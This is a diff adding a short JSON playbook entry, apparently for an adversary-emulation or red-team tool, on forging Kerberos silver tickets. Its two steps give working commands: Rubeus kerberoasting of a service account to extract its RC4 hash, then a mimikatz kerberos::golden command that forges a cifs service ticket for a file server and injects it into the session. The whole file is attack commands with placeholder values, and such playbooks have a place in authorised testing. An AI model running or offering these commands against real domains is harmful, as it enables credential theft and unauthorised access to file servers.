@@ -1,0 +1,19 @@
+{
+	"name": "Service-Level Ticket Forging",
+	"description": "Create silver tickets using compromised service account hashes.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Acquire Service Hash",
+			"command": "Rubeus.exe kerberoast /user:svc_sql /outfile:svc.txt",
+			"description": "Extract RC4 hash via roasting."
+		},
+		{
+			"index": 2,
+			"name": "Forge & Inject",
+			"command": "mimikatz.exe \"kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /rc4:NTLMHASH /service:cifs /target:fileserver.corp.local /ptt\"",
+			"description": "Generate and apply silver ticket."
+		}
+	]
+}
